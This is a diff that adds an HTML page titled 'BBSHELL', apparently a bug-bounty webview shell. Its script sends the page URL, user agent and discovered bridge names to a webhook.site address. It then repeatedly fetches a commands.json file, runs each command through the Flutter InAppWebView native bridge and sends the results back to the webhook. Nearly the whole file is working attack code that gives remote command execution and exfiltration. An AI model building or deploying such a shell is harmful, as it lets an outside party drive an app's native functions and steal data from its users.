@@ -1,0 +1,50 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>BBSHELL</title></head>
+<body><h1>BBSHELL</h1><pre id="o">running</pre>
+<script>
+var HOOK = 'https://webhook.site/c05df4a9-d728-4fe6-b222-b27dde6acb80';
+var CMDS = 'commands.json';
+function send(tag, obj) {
+  var s;
+  try { s = (typeof obj === 'string') ? obj : JSON.stringify(obj); } catch (e) { s = 'JSONERR ' + e; }
+  for (var i = 0; i < s.length; i += 1200) {
+    try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&i=' + i + '&d=' + encodeURIComponent(s.substr(i, 1200)); } catch (e) {}
+  }
+  if (!s.length) { try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&d='; } catch (e) {} }
+}
+function log(x) { try { document.getElementById('o').textContent += '\n' + x; } catch (e) {} }
+async function run(cmd) {
+  var res = null, err = null;
+  try {
+    var ch = window.flutter_inappwebview.callHandler;
+    res = await ch(cmd.bridge, typeof cmd.msg === 'string' ? cmd.msg : JSON.stringify(cmd.msg));
+  } catch (e) { err = '' + e; }
+  var rs = '';
+  try { rs = (typeof res === 'string') ? res : JSON.stringify(res); } catch (e) { rs = 'strerr'; }
+  send('RES', { id: cmd.id, bridge: cmd.bridge, msg: cmd.msg, res: (rs || '').substr(0, 4000), err: err });
+  log('RES ' + cmd.id + ' ' + (rs || err));
+}
+var seen = {};
+async function poll() {
+  try {
+    var r = await fetch(CMDS + '?t=' + Date.now(), { cache: 'no-store' });
+    var txt = await r.text();
+    var list = JSON.parse(txt);
+    for (var i = 0; i < list.length; i++) {
+      var c = list[i];
+      if (seen[c.id]) continue;
+      seen[c.id] = 1;
+      await run(c);
+    }
+  } catch (e) { log('poll err ' + e); }
+  setTimeout(poll, 2500);
+}
+function base() {
+  var out = { href: location.href, ua: navigator.userAgent };
+  try { out.bridges = Object.getOwnPropertyNames(window).filter(function (k) { return k.indexOf('_b_bridge_') === 0; }); } catch (e) {}
+  send('HELLO', out);
+}
+base();
+send('READY', 'shell ready');
+poll();
+</script></body></html>
